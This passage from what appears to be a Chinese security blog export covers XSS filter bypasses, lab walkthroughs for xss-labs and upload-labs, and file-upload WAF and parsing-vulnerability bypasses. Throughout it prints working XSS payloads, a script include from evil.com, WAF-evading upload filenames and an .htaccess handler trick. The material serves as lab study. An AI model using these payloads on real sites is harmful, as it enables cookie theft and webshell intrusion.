标签里。前两个引号被认为是一对，什么都不做，下一个引号和最后的匹配，但是事实不是这样。\n结果最终如下：\n&lt;img&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&amp;gt;\n7、绕过CSS 过滤器：\nHTML 标签用来插入 javaScript 很有用，但是 CSS 也是可以。\n把吧XSS 代码放到 LINK 方式引用的 CSS 的 href 属性里面去：\n&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;\n8、编码：\n使用 utf-7 编码可以绕过：\n例：&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;\n使用 UTF-7 编码后：\n+ADw-script+AD4-alert(+ACI-XSS+ACI-)+ADw-/script+AD4-\n然后所有的加号需要被改成%2b，否则会被浏览器识别为连接符：\n%2BADw-script%2BAD4-alert%281%29%2BADw-/script%2BAD4-\n\n\n\n字符\n实体引用\n\n\n\n空格\n%20\n\n\n&#x2F;\n%2F\n\n\n%\n%22\n\n\n?\n%3F\n\n\n+\n%2B\n\n\n发现XSS漏洞最常用的 XSS 漏洞测试代码：\n&lt;script>alert(\"XSS\")&lt;/script>\n\n当这个代码被注入到输入框或是 url 参数的时候，会成功也可能会失败，如果失败了。也不意味着网站就是安全的，需要继续渗透。\n","slug":"xss过滤的那些事","date":"2022-02-22T09:20:10.000Z","categories_index":"xss","tags_index":"xss","author_index":"Aurora"},{"id":"b564e09de39e303e8a190e6bd2a14088","title":"xss跨站-xss-labs","content":"[TOC]\n前言记录一下xss靶场，xss-labs通关过程。\n##Level-1（无过滤）\n###0x00\n可以看到给的提示是payload长度为4，地址栏中get方式的name&#x3D;test与欢迎用户test相对应，试着改一下name的参数值。\n\n0x01修改为test&#x3D;ease访问，可以看到参数值变为了ease：\n\n0x02插入以下语句执行：\n&lt;script>alert(/xss/)&lt;/script>\n\n可以看到，通关完成：\n\n0x03源码分析：\n\n可以看到get接收name参数值，之后输出name参数值，这里没有进行任何的过滤，直接插入跨站语句即可。\n##Level-2（闭合标签）\n0x00 第二关有了输入框，尝试xss语句看看效果，原样输出：\n\n0x01分析下代码：\n\n\n可以看到其中&lt;和&gt;都被编码成了html字符实体，value字段中插入的xss语句加了双引号，由于在代码中，双引号中的内容被当作字符串去输出，那这里的思路就是去闭合前后双引号绕过过滤。\nhtmlspecialchars() 函数：把预定义的字符 &quot;&lt;&quot; （小于）和 &quot;&gt;&quot; （大于）转换为 HTML 实体。\n0x02插入以下xss语句：\n\">&lt;script>alert(/xss/)&lt;/script>&lt;\"\n\n\n可以看到，绕过成功。\nLevel-3（单引号闭合+htmlspecialchar()函数）0x00\n0x01尝试注入：\n\n0x02注入：\n\">&lt;script>alert(/xss/)&lt;/script>&lt;\"\n\n查看源码，这次是单引号，将双引号改为单引号注入尝试。\n\n这里value字段也被编码为了html实体，源码中应该在value字段处也使用了htmlspecialchars()函数。\n0x03注入以下语句：\n&#39;&gt;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;&lt;&#39;\n\n原样输出：\n\n0x04查看源代码：\n\n这里还是使用了htmlspecialchars()函数，而且还是两次。\n0x05构造标签事件进行过滤，返回值实在input标签中，尝试构造onclick事件触发xss。点击输入框后，触发onclick事件，响应onclick中的javascript代码。\npayload:\n&#39;onclick&#x3D;&#39;alert(&#x2F;xss&#x2F;)\n\n执行结果后的源码，如图：\n\nonclick前单引号为了闭合value字段的单引号，=后面的单引号为了使原有的后单引号将语句闭合。\n或者：\n构造事件onmouseover，事件成功执行javascript:伪协议：\nonmouseover 事件：会在鼠标指针移动到指定的元素上时发生。\n&#39;onmouseover&#x3D;&#39;javascript:alert(&#x2F;xss&#x2F;)\n\n将鼠标指针移动到输入框时，触发onmouseover 事件，进而触发xss语句。\n\n0x06点击输入框，过关：\n\nLevel-4（双引号闭合+添加事件）0x00\n0x01尝试注入：\n&lt;script>alert(/xss/)&lt;/script>\n\n看源码：\n\n可以看到，源码中将&lt;和&gt;过滤掉了。\n0x02查看后端源码：\n\n源码将&lt;和&gt;都替换为空。\n0x03尝试使用&#39;onclick=&#39;alert(/xss/)注入，原样输出：\n\n0x04查看源码：\n双引号闭合；\n改为双引号继续注入：\n&quot;onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)\n\n点击输入框：\n\nLevel-5（ javascript伪协议）###0x00\n\n0x01尝试注入：\n&lt;script>alert(/xss/)&lt;/script>\n\n\n查看源码：\n\n这里将script进行了转化。\n0x02查看后端源码：\n\n将&lt;script替换为了&lt;scr_ipt导致浏览器无法解析JS代码；还将on替换为了o_n，这意味着构造标签事件就不能用了。\n0x03试着改变大小写是否能绕过：\n&quot;Onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)\n\n点击输入框后无反应，绕过失败。\n\n由于源码中将输入的参数值都进行了小写转换，导致绕过失败。\n0x04既然无法通过&lt;script&gt;标签或触发事件来执行js代码的话，那么可以换一个标\n签来执行js代码。\n构造以下payload：\n&quot;&gt;&lt;a href&#x3D;&#39;javascript:alert(1)&#39;&gt;&lt;&quot;\n\n点击&lt;&quot;&quot;&gt;，过关：\n\nLevel-6（大小写混合绕过）0x00\n0x01尝试注入：\n&lt;script>alert(/xss/)&lt;/script>\n\n这里还是对script进行了处理：\n\n\n0x02查看后端代码：\n可以看到，这里过滤了src，data和href等标签。\n源码中src主要是&lt;img&gt;标签的属性：\n正常的引用图 片就是将待引用图片的地址赋值给src属性。但是在js中如果src属性的值不正常或者无法 访问到时就可以触发一个onerror事件来执行js代码。\n&lt;img&gt;标签代码：\n&lt;img src&#x3D;111 onerror&#x3D;alert(&#39;xss&#39;)&gt;\n\n\n\n0x03源码中只是将标签进行了转化，转换的是小写字符，那这里试试大小写混合是否能绕过：\n&quot;&gt;&lt;a HrEf&#x3D;javascript:alert(&#x2F;xss&#x2F;)&gt;\n\n点击&quot;&gt;，可以看到绕过成功：\n\nLevel-7（双写绕过）0x00尝试注入：\n&lt;script>alert(/xss/)&lt;/script>\n\n这里直接将script替换为空：\n\n\n0x01尝试：\n&quot;&gt;&lt;a HrEf&#x3D;javascript:alert(&#x2F;xss&#x2F;)&gt;\n\nherf被过滤，大小写混合失败，应该是对大写字母进行了强制转换。\n\n0x02查看源码：\n\n强制转化为小写字母，过滤了script等标签。\n0x03由于对script等标签只过滤了一次，双写herf和script进行绕过尝试：\n&quot;&gt;&lt;a hrhrefef&#x3D;javasscriptcript:alert(&#x2F;xss&#x2F;)&gt;\n\n点击&quot;&gt;进行绕过：\n\nLevel-8（编码绕过）0x00\n0x01注入：\n&lt;script>alert(/xss/)&lt;/script>\n\n点击友情链接后：\n\n0x02查看源码：\n\n发现script被替换了，导致访问不了。\n查看后端代码：\n\n强制转换了小写，过滤了script等标签，还将&quot;替换为&amp;quot。\n0x03尝试编码绕过：\n编码前：\njavascript:alert(&#x2F;xss&#x2F;)\n\n编码后：\n&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#41;\n\n\n\n点击友情链接：\n\nLevel-9（检测关键字）0x00尝试注入：\n&lt;script>alert(/xss/)&lt;/script>\n\n源码显示链接不合法，这里可以猜测后端代码对链接进行了检查。\n\n0x01查看源代码：\n\nstrpos() 函数：查找字符串在另一字符串中第一次出现的位置。\n源码中过滤完各种关键字后会对链接使用strpos()函数检查是否含有http://字段，若没有则输出链接不合法。那这里的思路就是：在注入的语句中加入http://字段即可。\n0x02这里使用编码+//http://baidu.com进行绕过：\n&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#41;&#x2F;&#x2F;http:&#x2F;&#x2F;baidu.com\n\n\npayload解析：\n由于需要触发JS代码，编码后需要加入//注释符注释掉后面的链接地址，若不加//则会导致触发JS代码失败，而源码中的strpod()函数只是检查字符串中是否带有http://字段。\nLevel-10（隐藏信息）0x00\n可以看到这里与上面几关不同的是：没有输入框。\n0x01右键查看源代码得知，有三个隐藏的表单：\n\n0x02首先测试以下看看效果：\n&lt;script>alert(/xss/)&lt;/script>\n\n\n\n只是接收的参数值改变了。\n但这里有三个&lt;input&gt;标签的话，也就意味着是三个参数。\n试试修改type类型试试。\n0x03这里随便将三个hidden字段中的其中一个改为text即可，都可出现输入框：\n\n\n0x04由于没有提交表单的按钮，这里只能通过构造标签事件来进行触发JS代码：\npayload：\ntype&#x3D;&quot;text&quot; onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;\n\n\n点击输入框：\n\n0x05分析下后端代码：\n\n可以看到是第三个字段t_sort接收参数值，之后将&lt;和&gt;替换为空，然后在value字段处接收处理过后的参数值输出。\nLevel-11（Referer）0x00\n0x01查看源码：\n\n同样，和第10关大致相同，但这里出现了请求来源的函数；\n$_SERVER[&#39;HTTP_REFERER&#39;]：链接到当前页面的前一页面的 URL 地址。\n这里应该是通过修改请求来源达到插入xss语句。\n0x02使用第10关的方式同样也过关了，但这关的本意应该不是在这里。\n\n\n0x03抓个包，修改请求来源进行插入xss语句：\n\n0x04value接收到参数值后将&lt;和&gt;进行了替换为空：\n\n0x05构造事件标签进行绕过：\nReferer: &quot;onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot; type&#x3D;&quot;text&quot;&#x2F;&#x2F;\n\n\n\n\nLevel-12（User-agent）0x00\n0x01源代码这里可以看到有User-Agent字段，后端代码应该有获取这个字段的函数。\n\n那这里的思路和第11关差不多。\n0x02抓包修改User-Agent的值：\nUser-Agent: &quot;onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot; type&#x3D;&quot;text&quot;&#x2F;&#x2F;\n\n\n0x03点击输入框：\nLevel-13（Cookie）0x00\n###0x01\n查看源码：\n\n后端源码中获取的是cookie值，在t_cook处进行输出；原理和前两关一样。\n0x02抓包修改cookie值：\nCookie: user&#x3D;&quot;onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot; type&#x3D;&quot;text&quot;&#x2F;&#x2F;\n\n\n\n0x03点击输入框：\n\nLevel-140x00本关因iframe调用的文件地址失效，无法进行测试。要考的应该是通过修改iframe调用的文件来实现xss注入。\nLevel-15（ng-include）0x00\n0x01查看下源码，发现有JS文件和一个ng-include:字符串：\n\n后端源码中参数是通过get方式获取src进行传递：\n\nAngularJS： 是一个 **JavaScript 框架**。它可通过 &#96;&lt;script&gt;&#96; 标签添加到 HTML 页面。\n\nAngularJS指令 是以 **ng** 作为前缀的 HTML 属性。\n\nAngularJS ng-include 指令：用于包含外部的 HTML 文件；包含的内容将作为指定元素的子节点；ng-include属性的值可以是一个表达式，返回一个文件名。\n默认情况下，包含的文件需要包含在同一个域名下。\n值得注意的是：\n    ng-include,如果单纯指定地址，必须要加引号\n\n    ng-include,加载外部html，script标签中的内容不执行\n\n    ng-include,加载外部html中含有style标签样式可以识别\n\n具体用法参考：\nhttps://www.runoob.com/angularjs/angularjs-reference.html\n通俗点来说：ng-include其作用相当于php的include函数。那这关的思路就是通过传入包含xss漏洞的文件进行触发xss。\n0x02那这里利用这两点： \n1、ng-include,如果单纯指定地址，必须要加引号\n2、包含外部的 HTML 文件\n进行攻击；既然可以包含外部的html文件，将前面几关的其中一个文件包含进来进行触发xss漏洞。\n构造payload：\n&#39;level1.php?name&#x3D;&lt;a href&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;&#39;\n\n\n0x03点击payload的长度:34：\n\nLevel-16（空格实体转义）0x00\n0x01先修改下参数值看看，参数值改变：\n\n0x02看下源码：\n可以看到将script，/，空格进行了过滤，其中空格进行了两次过滤。\n0x03使用事件型注入+替换空格进行尝试：\n&lt;img%0Asrc&#x3D;?%0Aonerror&#x3D;alert(&#39;xss&#39;)&gt;\n\n由于在html里，回车（%0A）是可以代替空格的\n\n0x04为什么不使用这个payload：\n&lt;a href&#x3D;onclick&#x3D;&quot;alert(1)&quot;&gt;\n\n\n\nLevel-17（参数拼接）0x00可以看到地址栏参数有些略微不同，应该是由arg01和arg02这两个字段传参：\n（这里由于不支持swf文件格式，文件无法显示）\n\n0x01先随便传个参试试：\n\n\n源代码中接收参数的src发生了变化，这里xsf01.swf需要值得注意。\n\nswf：swf文件通常也被称为Flash文件。SWF格式文件广泛用于创建吸引人的应用程序，它们包含丰富的视频、声音、图形和动画。\n0x02这里根据源码使用事件型进行注入：\nonclick&#x3D;&quot;alert(&#39;xss&#39;)\n\n\n源码中成功插入xss语句，由于插件原因，不能够进行点击执行。\nLevel-18（参数拼接）0x00与第17关一样，环境有问题，思路也一样。\n\n0x01patload：\nonmouse&#x3D;alert(&#x2F;xss&#x2F;)\n\n\nLevel-19-20（Flash XSS）0x00基于Flash的xss漏洞。\n19关查看源码得知这里src的值使用双引号进行了包含\n\n0x01后端代码：\n\n一般思路有双引号肯定要进行闭合，最后触发js代码，但这里有htmlspecialchars()函数进行过滤，显然闭合是行不通的。\nflash xss先告一段落，有时间再深入研究。\nFlash产生的xss问题主要有两种方式：1、加载第三方资源\n2、与javascript通信引发XSS。\n常见的可触发xss的危险函数有：\ngetURL navigateToURL ExternalInterface.call htmlText loadMovie等\n要想知道这一关的是不是属于flash xss，只需要对引用的swf文件\n进行反编译然后进行源码分析。\n这里我说使用的对此类文件进行反编译的工具是jpexs-decompiler。\n项目地址:https://github.com/jindrapetrik/jpexs-decompiler\nFlash XSS参考文章：https://baynk.blog.csdn.net/article/details/103213877\n","slug":"xss跨站-xss-labs","date":"2022-02-21T14:58:27.000Z","categories_index":"xss","tags_index":"靶场,xss","author_index":"Aurora"},{"id":"2ae9b590ca3c1c2667fd185e3a54758c","title":"XSS基础","content":"前言XSS跨站脚本攻击：\nXSS原理恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。属于前端漏洞。\n（若有与对方交互的地方，就可能会有攻击点）\nXSS分类1、反射型（非持久型）：通过在页面上植入恶意链接，诱使用户点击，执行js脚本，所谓反射型XSS就是将用户输入的数据（恶意用户输入的js脚本），“反射”到浏览器执行。\n2、存储型（持久型）：此类XSS漏洞是指，用户输入的数据（恶意代码）可以“存储”在服务端，只要有人访问这个包含有存储型XSS代码的页面，XSS脚本就会在他们的浏览器中执行，这种XSS具有很强的稳定性。所以也被称做，“持久型XSS”。\n3、DOM型：它和前两种的区别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。\nDOM型常见输入点：document.location（以及location的多个属性）\ndocument.referrer\ndocument.cookie\nDocument 对象：每个载入浏览器的 HTML 文档都会成为 Document 对象。\nDocument 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问。\nXSS-“跨站脚本”重要的是脚本跨站脚本的重点不在“跨站”上，而应该在“脚本”上。“跨”是属于浏览器的特性，而不是缺陷，造成“跨”这样的假象是因为绝大多数XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源，由于任何安全问题都存在“输入”的概念，很多时候输入的内容是有限制的。真正的XSS攻击弹出窗毫无意义，所以攻击代码可能会比较长，一般会注入类似下面的代码来引用第三方域上的脚本资源：\n&lt;script src=\"http://www.evil.com/xss.js\">&lt;/script>\n\n这样的好处就是：代码容易控制。对于上面的例子，虽然xss.js的文件资源在www.evil.com上，但脚本内容却属于嵌入对象所在的浏览器上下文环境中。换句话说：人在你那里，但是心在我这里，战场就在我这里。既然战场在我这里，怎么玩那就是脚本的事了，脚本中实现任何想要的功能。比如：盗取用户身份认证信息，篡改用户数据等。\nXSS常规攻击手法1、盗用cookie，获取敏感信息。\n2、利用植入Flash，通过crossdomain权限设置进一步获取更高权限;或者利用Java等得到类似的操作。\n3、利用iframe、frame、或上述Flash等方式，以用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。\n4、利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。\n5、在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDos攻击的效果。\n例：\n&lt;script>alert(“hey!you are attacked”)&lt;/script>\n\n\n\n\n\nXSS常用场景由于XSS漏洞只有通过触发脚本语句才会执行，并且XSS漏洞的限制很多，代码触发不了XSS漏洞也就利用不了。而运用最多的地方，例如：留言板，订单页面等等，管理员经常查看的页面才有很大的成功率会触发XSS漏洞。这也表示XSS漏洞的限制很大。\n用户凭据用户凭据：通过凭据可以判断对方身份信息\ncookie：存储在本地，存活时间长，小中型网站\nsession：会话，存储在服务器，存活时间较短，大型网站\nwebshell工具\nhttps://github.com/tennc/webshell\n","slug":"XSS基础","date":"2022-02-20T13:42:18.000Z","categories_index":"xss","tags_index":"xss","author_index":"Aurora"},{"id":"07ba4ec78c8c1a3bf9ee409d03b686e2","title":"文件上传-WAF绕过","content":"前言由于在真实环境当中，网站会有相应的软件防护，通常发现文件上传漏洞后还要进行WAF绕过，而类似的防护软件有safedog，BT等，所以需要了解防护的规则并且绕过防护。\n当然，这里的WAF绕过是广义上的，不单单是指防护软件，类似前后端源码的防护规则也需要进行WAF绕过。\n上传参数名解析Content-Disposition：一般可更改 \nname：表单参数值，不能更改（一般右键源码可以看到）\nfilename：文件名，可以更改 \nContent-Type：文件 MIME，视情况更改\n常见绕过方法1、数据溢出-防匹配：\n原理：有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；\n注：要在form-data;和neme=&quot;upload_file&quot;;字段中间添加大量垃圾数据，垃圾数据最后一定要添加;，为了让检测时候误认为是数据包的字段；或者添加在name和filename字段中间也可以。\n2、符号变异-防匹配（&#39; &quot; ;）：\n原理：安全狗只匹配&#39;，&quot;之间的内容，就是单写一个&#39;或&quot;会绕过安全狗的检测，取最后一个&#39;或&quot;之前的内容安全狗才提取。大多都是多多测试，然后过狗；而;在语言当中是语句的结束，所以也可以绕过。\n3、数据截断-防匹配(%00 ; 换行) ：\n（%00截断在安全狗4.0不能绕过，旧版可以）\n文件后缀回车绕过：若上传x.php文件，抓包进行后缀名会后，\n安全狗检测时的原型是：x.p\\nh\\np，则实现绕过。\n4、重复数据-防匹配(参数多次)：\n重复filename=&quot;&quot;;字段等。\n5、Fuzz大法\n参考文章：\nhttp://www.cl4y.top/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0bypass%E5%AE%89%E5%85%A8%E7%8B%974-0/\nPayload：\nfilename&#x3D;&quot;Content-Type: image&#x2F;jpeg;x.php&quot;;\n\nfilename&#x3D;&quot;Content-Disposition: from-data; name&#x3D;&quot;upload_file&quot;x.php&quot;;\n\nfilename&#x3D;&quot;xxx&#x2F;x.jpg&quot;\n\nfilename&#x3D;\n&quot;\nx\n.\np\nh\np\n&quot;\n\n总之，各种绕过安全狗的姿势需要多尝试，由于安全狗版本问题，可能有些payload已经被拦截。\n\n","slug":"文件上传-WAF绕过","date":"2022-02-18T07:45:11.000Z","categories_index":"文件上传","tags_index":"文件上传,Bypass WAF","author_index":"Aurora"},{"id":"8822ebc3b04f9f9d5f4a65e981067804","title":"文件上传-解析漏洞","content":"前言由于中间件会出现解析漏洞，若配合文件上传会出现很大的安全危害。这里以Vulhub靶场进行漏洞复现，在这之前要了解一下中间件，服务器和Web服务器的区别。\n中间件，服务器和Web服务器的区别一、服务器的定义：\n服务器指的是一个管理资源并为用户提供服务的计算机软件，通常分为文件服务器、数据库服务器和应用程序服务器。运行以上软件的计算机或计算机系统也被称为服务器。\n二、中间件\n中间件是服务器上负责解析http请求的一组应用程序，负责接收并解析http请求数据包，在服务器上找到数据包所请求的文件后，将其返回给客户端，如果http数据包所请求的是一个动态脚本文件，如php等，中间件就要靠CGI与脚本语言解析软件进行交互，处理好动态脚本文件后，再将处理后的文件其返回给浏览器。\n说白了，中间件就是服务器上web端口（通常为80端口）的一个翻译官，负责告诉服务器用户要请求哪些文件，如果用户请求的是一个静态的html页面，就直接在服务器上找到对应文件并将其交给用户浏览器，如果用户请求的是一个动态页面如php，asp等，中间件在找到该文件后，将其交给对应的脚本语言解析程序，脚本语言解析程序将文件解析成html后，再把解析过的文件发送给浏览器。\n所以，浏览器本身并不能渲染解析动态脚本文件，以php为例，浏览器解析的.php文件，实际上是经服务器php程序解析后的html文件。\n再者，如果服务器上没有安装中间件，那么服务器就不能理解用户发来的http数据包是什么意思，当然也就无法对http请求包进行正确的响应。\n三、Web服务器\nweb服务器就是安装了中间件的服务器，如装了Nginx、Apache服务等。\n原文链接：\nhttps://www.cnblogs.com/greycdoer0/p/10484309.html\nTomcat PUT方法任意写文件漏洞复现0x00 漏洞原理在 Windows 服务器下，Tomcat配置文件&#x2F;conf&#x2F;web.xml中，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。\n0x01 漏洞环境vulhub&#x2F;tomcat&#x2F;CVE-2017-12615\n使用docker-compose build启动漏洞环境：\n\n0x02首先访问一个不存在的文件1.jsp，可以看到404页面：\n\n0x03根据漏洞原理，方式readonly为false时，使用PUT方式可对服务器写入文件；\n利用PUT方式请求创建文件：\n\n0x04再次请求1.jsp文件，访问成功；这里shell只是表达一个含义：可以写入JSP后门代码，最后使用后门工具进行控制。\n\nApache未知扩展名解析漏洞0x00 未知扩展名解析漏洞Apache的解析漏洞依赖于一个特性：Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，直到识别到合法后缀才进行解析。\n例：x.php.xxx.yyy\n先识别最后的yyy，如果不识别，向前解析，直到识别到php\n0x01 漏洞利用场景如果对方中间件Apache属于低版本，我们可以利用文件上传，上传一个不识别的文件后缀，利用解析漏洞规则成功解析文件，然后将写入其中的后门代码触发。\n##Apache HTTPD 多后缀解析漏洞\n###0x00 漏洞复现\n访问这个地址先进行文件上传，上传test.php.jpg文件：\nhttp:&#x2F;&#x2F;靶机IP&#x2F;uploadfiles&#x2F;index.php\n\n\n可以看到上传的文件路径：\n0x01按照路径访问文件，成功解析出其中的后门代码：\n\n0x02由于http://靶机IP/index.php中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，利用Apache解析漏洞进行getshell。\nApache HTTPD 换行解析漏洞（CVE-2017-15715）0x00 原理Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。\n0x01 漏洞复现启动靶场环境：\n\n0x02上传一个1.php文件，可以看到返回结果错误：\n\n\n0x03在1.php后面插入一个\\x0A，可以看到上传文件成功：\n\n0x04访问文件，成功解析：由于文件不是php后缀，说明目标存在解析漏洞。\n\nIIS和Nginx解析漏洞漏洞利用访问一张图片地址，后面增加/.php，图片文件被解为php文件，执行后门代码。\nNginx配置文件错误导致的解析漏洞：\n对于任意文件名，在后面添加&#x2F;xxx.php（xxx为任意字符）后,即可将文件作为php解析。\n**IIS 6.x **\n基于文件名：\n该版本 默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是 服务器默认不解析; 号及其后面的内容，相当于截断。\n基于文件夹名 ：\n该版本 默认会将 *.asp&#x2F;目录下的所有文件当成Asp解析。\n漏洞检测随便访问网站的图片地址，后面增加/.php，若出现错误，则无解析漏洞，若非错误提示，则存在此解析漏洞，后续只需寻找一个上传点即可获取权限。\n其他还有Nginx 文件名逻辑漏洞（CVE-2013-4547）等。\n参考文章：https://blog.werner.wiki/file-resolution-vulnerability-nginx/\n","slug":"文件上传-解析漏洞","date":"2022-02-17T13:22:37.000Z","categories_index":"文件上传","tags_index":"文件上传,靶场","author_index":"Aurora"},{"id":"839a0bf2eef6223788002c9f68db568c","title":"文件上传-upload-labs","content":"Pass-01（前端JS绕过）0x00首先分析一下源码：\n\n\n$_FILES：PHP中的$_FILES 是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $_FILES 为二维数组；如果为多个文件上传，那么 $_FILES 为三维数组。\nmove_uploaded_file() 函数：把上传的文件移动到新位置。\n通过源码可以看到这是前端验证，一般前端验证都是纸老虎。\n0x01这关有三种方式：浏览器禁用JS，抓包，本地修改源码。\n####禁用JS\n\n\n可以看到禁用JS后1.php文件已上传，但实战中这种方式并不推荐，实战中其他的JS文件可能会有其他功能，禁用JS会导致其他功能的失败，达不到想要的效果。\n访问上传的文件：\n\n####抓包\n修改文件后缀：\n修改前：\n\n修改后进行放包：\n可以看到文件已上传4.php：\n\n\n访问4.php文件，jpg格式被解析成php格式执行，之后执行了恶意语句：\n本地修改源码右键查看源代码删除JS代码修改文件后缀名为html：\n\n由于上传文件是要上传给服务器，但此时复制出来的源码没有上传路径，此时就要打开浏览器：右键-&gt;检查-&gt;网络-&gt;上传正常的图片-&gt;找到POST请求的上传路径复制下来-&gt;填到action字段后面：\n\n接下来上传文件即可：\n5.php文件已被上传：\n\n\nPass-02（MME绕过）源码分析：\n\n由于源码中有type字段，可见这关是常见验证中的文件类型验证，也就是验证MIME信息，因此，思路就是抓包将Content-Type修改为允许上传的类型（image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif）三选一。\n0x00将application/octet-stream字段修改为可允许通过的类型：\n\n###0x01\n这里选择jpg类型：image&#x2F;jpeg\n\n（这里记得将文件名修改一下，因为服务器不允许相同文件名存在）\n###0x02\n文件已上传：\n\nPass-03（上传特殊解析后缀绕过）0x00看源码，黑名单验证：\n\n先了解下函数：\n$deny_ext：不允许通过的文件后缀\ntrim()函数： 函数移除字符串两侧的空白字符或其他预定义字符。\ndeldot()函数：删除文件名末尾的点\n::$DATA ：在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名。\n例如:&quot;phpinfo.php::$DATA&quot;Windows会自动去掉末尾的::$DATA变成&quot;phpinfo.php&quot;\n整个源码：将上传的文件先用trim()函数去掉文件名和后缀名两侧的空格（这是由于抓到数据包之后文件的名字和后缀名可添加空格进行执行），同样deldot()函数也是同理。\n利用黑名单缺陷：黑名单验证若是黑名单定义不完整的话是可以实现绕过的，用.phtml，.php，.php5，.pht进行绕过。\n0x01这里将6.php修改为6.php5：\n\n可以看到文件已上传：（这里上传上去文件名会改变）\n\n0x02访问文件：\n这里如果要访问6.php5文件的话必须修改Apache配置文件，将一下注释符去掉：\nAddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht\n\n\n\n\n\n\n\nPass-04（上传.htaccess）0x00\n这关和上一关最大的区别 就是黑名单添加的更多了。这种情况，尝试上传一个.htaccess配置文件。创建.htaccess文件内容写：\n&lt;FilesMatch &quot;2&quot;&gt;\nSethandler application&#x2F;x-httpd-php\n&lt;&#x2F;FilesMatch &gt;\n\n此时，访问2.jpg文件即可。\n可以看到上传成功：\n注意.htaccess文件不能起名字，它就是.htaccess文件，如果将它改为4.htaccess或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。\n#Pass-05（点和空格绕过）\n0x00源码分析，这关将.htaccess后缀名拉入了黑名单，而且源码中对于删除末尾的点和收尾去空的操作只进行了一次过滤。\n\n思路：因此将数据包中的.php改成.php. .，由于它会先检查文件名末尾的点，然后再去空，但只检查一次，还是会留下一个.形成.php.这时候就进行了绕过。\n（但如果这里使用循环的话，这个方法是不可行的）\n0x01抓包，将6.php改为9.php. .:\n\n###0x02\n可以看到9.php文件已经被上传：\n\n###0x03\n访问9.php：\n#Pass-06（大小写绕过）\n0x00\n源码中将大小写转换一行去掉了，也就是说没有进行大小写转换。\n思路：那这里可以使用大写或者大小写混合进行绕过。\n0x01上传1.php，修改为大小写混合：\n\n\n###0x02\n可以看到已上传，这里文件名会被自动修改：\n\n0x03访问1.php：\n\nPass-07（空格绕过）源码可以看到，去空一行没有了，那这关抓包在后缀名后面添加空格即可。\n\n0x00上传6.php文件，后缀名加空格：\n\n###0x01\n文件已上传：\n0x02访问文件：\nPass-08（点绕过）源码将删除末尾的点一行去掉了，这关思路就是抓包加点：\n\n0x00改包：\n\n0x01文件已上传：\n\n0x02访问文件：\nPass-09（::$DATA绕过）0x00源码将字符串::$DATA一行去掉，这里直接加上字符串::$DATA上传。\n\n0x01抓包改包：\n0x02访问文件：\n\n\nPass-100x00和第5关相同\nPass-11（双写绕过）0x00看到源码把那几行过滤的代码都去掉了，就试着随便上传了一下：\n\n可以看到，直接把后缀名过滤了：\n那这里应该就是不允许使用.php后缀的文件，直接双写绕过。\n0x01抓包改包：\n0x02绕过成功：\n\n0x03访问文件：\nPass-02–Pass-11总结以上这几关都是黑名单绕过，而且过滤语句没有涉及循环，都是验证一次，理解每一关的思路，了解每一关方法是重点。\nPass-12（%00截断）0x00白名单验证：\n\n涉及函数：PHP strrpos() 函数：查找字符串在另一字符串中最后一次出现的位置。\n这里就是：查找文件名后缀在字符串中最后一次出现的位置\n源码中可以看到文件路径是可以控制的，那这里通过%00进行截断上传文件。由于是get方式进行提交，所以直接填%00即可，因为get方式会自动编码，而post方式需要手动转换。\n注意：%00只能用于php版本低于5.3的\n0x01%00截断：在url中%00表示ascll码中的0 